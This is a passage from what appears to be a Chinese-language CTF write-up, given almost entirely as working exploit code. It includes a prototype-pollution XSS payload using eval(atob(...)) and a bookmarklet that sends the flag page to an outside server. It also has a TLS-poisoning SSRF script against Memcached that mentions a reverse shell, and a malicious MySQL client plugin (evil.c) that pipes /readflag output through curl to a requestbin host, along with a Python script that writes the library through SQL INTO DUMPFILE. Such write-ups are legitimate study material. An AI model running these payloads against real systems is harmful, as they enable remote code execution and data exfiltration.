</span></span><span class=line><span class=cl>    <span class=nx>socket</span><span class=p>.</span><span class=nx>onclose</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;closed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>start</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=c1>// change here if you want to xss other use 
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kr>const</span> <span class=nx>to</span> <span class=o>=</span> <span class=s1>&#39;admin&#39;</span>
</span></span><span class=line><span class=cl>      
</span></span><span class=line><span class=cl>      <span class=c1>// prototype pollution
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=nx>socket</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>({</span>
</span></span><span class=line><span class=cl>          <span class=nx>api</span><span class=o>:</span> <span class=s1>&#39;sendmsg&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>          <span class=nx>to</span><span class=p>,</span>
</span></span><span class=line><span class=cl>          <span class=nx>msg</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>type</span><span class=o>:</span> <span class=s1>&#39;tpl&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>data</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=nx>tpl</span><span class=o>:</span> <span class=s1>&#39;test.tpl&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=nx>ctx</span><span class=o>:</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>({</span>
</span></span><span class=line><span class=cl>                <span class=nx>constructor</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=nx>prototype</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>username</span><span class=o>:</span> <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>allowImage</span><span class=o>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>                  <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=p>})</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=c1>// trigger XSS
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>socket</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>({</span>
</span></span><span class=line><span class=cl>            <span class=nx>api</span><span class=o>:</span> <span class=s1>&#39;sendmsg&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>to</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>msg</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=nx>type</span><span class=o>:</span> <span class=s1>&#39;image&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=nx>data</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>src</span><span class=o>:</span> <span class=s1>&#39;https://webhook.site/2f5fbcb1-c4aa-473a-adfd-23a7c5e19509?q=image&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=nx>attrs</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=nx>wow</span><span class=o>:</span> <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                  <span class=nx>is</span><span class=o>:</span> <span class=s1>&#39;abc&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                  <span class=nx>onanimationstart</span><span class=o>:</span> <span class=sb>`eval(atob(&#34;</span><span class=si>${</span><span class=nx>exp</span><span class=si>}</span><span class=sb>&#34;))`</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                  <span class=nx>style</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>animation</span><span class=o>:</span> <span class=s1>&#39;1s App-logo-spin&#39;</span>
</span></span><span class=line><span class=cl>                  <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}))</span>
</span></span><span class=line><span class=cl>      <span class=p>},</span> <span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=bewhatyouwannabe>beWhatYouWannaBe</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JavaScript data-lang=JavaScript><span class=line><span class=cl><span class=nx>javascript</span><span class=o>:</span><span class=nx>s</span><span class=o>=</span><span class=nx>q</span><span class=p>=&gt;</span><span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;https://vps?q=&#39;</span><span class=o>+</span><span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>q</span><span class=p>));</span><span class=nx>s</span><span class=p>(</span><span class=s1>&#39;start&#39;</span><span class=p>);</span><span class=nx>w</span><span class=o>=</span><span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>);</span><span class=nx>setTimeout</span><span class=p>(()=&gt;{</span><span class=nx>s</span><span class=p>(</span><span class=s1>&#39;timeout&#39;</span><span class=p>);</span><span class=nx>s</span><span class=p>(</span><span class=nx>w</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>innerText</span><span class=p>)},</span><span class=mi>1000</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=tolesion>ToLeSion</h2><p>TLS Poison 攻击通过FTPS被动模式 ssrf去打Memcached，写入session值为pickle反序列化payload。TLS 工具：https://github.com/ZeddYu/TLS-poison/ ，按照 setup 做好初始化后，使用如下命令开启 rustls 的转发功能，将 TLS 上层流量转发到 2048 端口：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048 
</span></span><span class=line><span class=cl>import socketserver, threading, requests, subprocess,time, base64, secrets,sys, hashlib, os
</span></span><span class=line><span class=cl>import redis, secrets, re
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># https://github.com/jmdx/TLS-poison modified for accepting 32 bytes injections
</span></span><span class=line><span class=cl>os.system(f&#39;nohup /home/ubuntu/TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048 --verbose &gt;run.log 2&gt;&amp;1 &amp;&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>class MyTCPHandler(socketserver.StreamRequestHandler):
</span></span><span class=line><span class=cl>    def handle(self):
</span></span><span class=line><span class=cl>        print(&#39;[+] connected&#39;, self.request, file=sys.stderr)
</span></span><span class=line><span class=cl>        self.request.sendall(b&#39;220 (vsFTPd 3.0.3)\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>        print(self.data, file=sys.stderr,flush=True)
</span></span><span class=line><span class=cl>        self.request.sendall(b&#39;230 Login successful.\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>        print(self.data, file=sys.stderr)
</span></span><span class=line><span class=cl>        self.request.sendall(b&#39;227 yolo\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>        print(self.data, file=sys.stderr)
</span></span><span class=line><span class=cl>        self.request.sendall(b&#39;227 yolo\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>        print(self.data, file=sys.stderr)
</span></span><span class=line><span class=cl>        self.request.sendall(b&#39;257 &#34;/&#34; is the current directory\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        if True:
</span></span><span class=line><span class=cl>            self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>            print(self.data, file=sys.stderr)
</span></span><span class=line><span class=cl>            if f&#39;CWD {secret_path}&#39; != self.data:
</span></span><span class=line><span class=cl>                return
</span></span><span class=line><span class=cl>            self.request.sendall(b&#39;250 Directory successfully changed.\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>            print(self.data, file=sys.stderr)
</span></span><span class=line><span class=cl>            self.request.sendall(b&#39;250 Directory successfully changed.\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>        print(self.data, file=sys.stderr)
</span></span><span class=line><span class=cl>        self.request.sendall(b&#39;227 Entering Passive Mode (127,0,0,1,43,192)\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>        print(self.data, file=sys.stderr)
</span></span><span class=line><span class=cl>        self.request.sendall(b&#39;227 Entering Passive Mode (127,0,0,1,43,192)\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>        print(self.data, file=sys.stderr)
</span></span><span class=line><span class=cl>        self.request.sendall(b&#39;200 Switching to Binary mode.\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>        assert &#39;SIZE refs&#39; == self.data, self.data
</span></span><span class=line><span class=cl>        print(self.data, file=sys.stderr)
</span></span><span class=line><span class=cl>        self.request.sendall(b&#39;213 7\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>        print(self.data, file=sys.stderr)
</span></span><span class=line><span class=cl>        self.request.sendall(b&#39;150 Opening BINARY mode data connection for refs (7 bytes).\r\n&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        print(sess.get(url, params={&#39;url&#39;: cmd}).text)
</span></span><span class=line><span class=cl>        self.data = self.rfile.readline().strip().decode()
</span></span><span class=line><span class=cl>        print(self.data, file=sys.stderr)
</span></span><span class=line><span class=cl>        self.request.sendall(b&#39;250 Requested file action okay, completed.&#39;)
</span></span><span class=line><span class=cl>        exit()
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def ftp_worker():
</span></span><span class=line><span class=cl>    with socketserver.TCPServer((&#39;0.0.0.0&#39;, 2048), MyTCPHandler) as server:
</span></span><span class=line><span class=cl>        while True:
</span></span><span class=line><span class=cl>            server.handle_request()
</span></span><span class=line><span class=cl>threading.Thread(target=ftp_worker).start()
</span></span></code></pre></td></tr></table></div></div><p>再用写入的cookie去访问即可触发，反弹shell拿flag</p><h2 id=myclient>myclient</h2><ol><li>使用 MYSQLI_INIT_COMMAND 选项 + INTO DUMPFILE，写一个 evil mysql 客户端认证库到 /tmp/e10adc3949ba59abbe56e057f20f883e</li><li>使用 MYSQLI_INIT_COMMAND 选项 + INTO DUMPFILE 写入一个 Defaults 配置，其中group=client plugin-dir=/tmp/e10adc3949ba59abbe56e057f20f883e 和 default-auth=&lt;name of library file - extension></li><li>使用 MYSQLI_READ_DEFAULT_FILE 选项设置为 /tmp/e10adc3949ba59abbe56e057f20f883e/<writtenconfigfile> 来加载一个恶意的配置文件，该文件将触发我们的 evil.so ，然后触发 init 函数。</li><li>RCE</li></ol><p>evil.c:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;mysql/client_plugin.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;mysql.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>Ubuntu x86_64:
</span></span></span><span class=line><span class=cl><span class=cm>apt install libmysqlclient-dev
</span></span></span><span class=line><span class=cl><span class=cm>gcc -shared -I /usr/include/mysql/ -o evilplugin.so evilplugin.c
</span></span></span><span class=line><span class=cl><span class=cm>NOTE: the plugin_name MUST BE the full name with the directory traversal!!!
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>evil_init</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span> <span class=n>a</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>b</span> <span class=p>,</span> <span class=kt>int</span> <span class=n>c</span> <span class=p>,</span> <span class=n>va_list</span> <span class=n>ds</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/readflag | curl -XPOST http://dnsdatacheck.7twx8in3gacdrrvq.b.requestbin.net/xxd -d @-&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>evilplugin_client</span><span class=p>(</span><span class=n>MYSQL_PLUGIN_VIO</span> <span class=o>*</span><span class=n>vio</span><span class=p>,</span> <span class=n>MYSQL</span> <span class=o>*</span><span class=n>mysql</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>res</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>res</span><span class=o>=</span> <span class=n>vio</span><span class=o>-&gt;</span><span class=nf>write_packet</span><span class=p>(</span><span class=n>vio</span><span class=p>,</span> <span class=p>(</span><span class=k>const</span> <span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=n>mysql</span><span class=o>-&gt;</span><span class=n>passwd</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>mysql</span><span class=o>-&gt;</span><span class=n>passwd</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>CR_OK</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>mysql_declare_client_plugin</span><span class=p>(</span><span class=n>AUTHENTICATION</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;auth_simple&#34;</span><span class=p>,</span>  <span class=cm>/* plugin name */</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;Author Name&#34;</span><span class=p>,</span>                        <span class=cm>/* author */</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;Any-password authentication plugin&#34;</span><span class=p>,</span> <span class=cm>/* description */</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>},</span>                              <span class=cm>/* version = 1.0.0 */</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;GPL&#34;</span><span class=p>,</span>                                <span class=cm>/* license type */</span>
</span></span><span class=line><span class=cl>  <span class=nb>NULL</span><span class=p>,</span>                                 <span class=cm>/* for internal use */</span>
</span></span><span class=line><span class=cl>  <span class=n>evil_init</span><span class=p>,</span>                                 <span class=cm>/* no init function */</span>
</span></span><span class=line><span class=cl>  <span class=nb>NULL</span><span class=p>,</span>                                 <span class=cm>/* no deinit function */</span>
</span></span><span class=line><span class=cl>  <span class=nb>NULL</span><span class=p>,</span>                                 <span class=cm>/* no option-handling function */</span>
</span></span><span class=line><span class=cl>  <span class=n>evilplugin_client</span>                    <span class=cm>/* main function */</span>
</span></span><span class=line><span class=cl><span class=n>mysql_end_client_plugin</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>codecs</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>genName</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span><span class=p>)</span> <span class=o>+</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span><span class=p>)</span> <span class=o>+</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span><span class=p>)</span><span class=o>+</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span><span class=p>)</span> <span class=o>+</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span><span class=p>)</span> <span class=o>+</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span><span class=p>)</span> <span class=o>+</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span><span class=p>)</span> <span class=o>+</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://124.71.205.170:10047/index.php&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shell</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;exp.so&#34;</span><span class=p>,</span><span class=s2>&#34;rb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>100</span>
</span></span><span class=line><span class=cl><span class=n>chunks</span> <span class=o>=</span> <span class=p>[</span><span class=n>shell</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=n>n</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>shell</span><span class=p>),</span> <span class=n>n</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>chunks</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prefix</span> <span class=o>=</span> <span class=n>genName</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>idx</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>chunks</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=s1>&#39;/tmp/e10adc3949ba59abbe56e057f20f883e/&#39;</span> <span class=o>+</span> <span class=n>prefix</span><span class=o>+</span><span class=s2>&#34;_CHUNK&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>chunk</span> <span class=o>=</span> <span class=n>chunks</span><span class=p>[</span><span class=n>idx</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=s2>&#34;0x&#34;</span> <span class=o>+</span><span class=n>codecs</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>chunk</span><span class=p>,</span><span class=s1>&#39;hex&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>idx</span> <span class=o>!=</span> <span class=mi>0</span> <span class=ow>and</span> <span class=n>idx</span> <span class=o>!=</span> <span class=nb>len</span><span class=p>(</span><span class=n>chunks</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>previus_name</span> <span class=o>=</span> <span class=s1>&#39;/tmp/e10adc3949ba59abbe56e057f20f883e/&#39;</span> <span class=o>+</span> <span class=n>prefix</span><span class=o>+</span><span class=s2>&#34;_CHUNK&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sql</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;SELECT concat(LOAD_FILE(&#39;</span><span class=si>{</span><span class=n>previus_name</span><span class=si>}</span><span class=s2>&#39;), </span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2>) INTO DUMPFILE &#39;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2>&#39;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;3&#34;</span><span class=p>,</span> <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=n>sql</span><span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>idx</span> <span class=o>==</span> <span class=nb>len</span><span class=p>(</span><span class=n>chunks</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>previus_name</span> <span class=o>=</span> <span class=s1>&#39;/tmp/e10adc3949ba59abbe56e057f20f883e/&#39;</span> <span class=o>+</span> <span class=n>prefix</span><span class=o>+</span><span class=s2>&#34;_CHUNK&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sql</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;SELECT concat(LOAD_FILE(&#39;</span><span class=si>{</span><span class=n>previus_name</span><span class=si>}</span><span class=s2>&#39;), </span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2>) INTO DUMPFILE &#39;/tmp/e10adc3949ba59abbe56e057f20f883e/auth_simple.so&#39;&#34;</span>
